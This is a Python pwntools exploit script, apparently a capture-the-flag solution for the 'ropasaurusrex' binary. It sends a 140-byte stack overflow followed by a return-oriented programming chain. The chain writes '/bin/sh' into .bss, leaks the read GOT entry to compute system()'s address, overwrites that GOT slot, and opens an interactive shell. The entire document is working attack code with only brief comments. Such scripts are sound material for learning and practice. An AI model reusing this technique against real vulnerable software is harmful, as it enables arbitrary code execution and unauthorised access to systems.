from pwn import *
import time

p = process("./ropasaurusrex")

read_plt = 0x804832c
read_got = 0x804961c
write_plt = 0x804830c
write_got = 0x8049614
offset = 0x9d280
pppr = 0x80484b6
bss = 0x8049628
shell = '/bin/sh'

# write "/bin/sh" in dynamic section
payload = 'A'*140
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(len(shell))

# print read_got 
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

# change read_got into system function
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(read_got)
payload += p32(4)

# call read , actually system("/bin/sh")
payload += p32(read_plt)
payload += 'A'*4
payload += p32(bss)

p.send(payload)

p.send(shell)
time.sleep(1)
read_addr = u32(p.recv(4))
system_addr = read_addr - offset

p.send(p32(system_addr))

p.interactive()
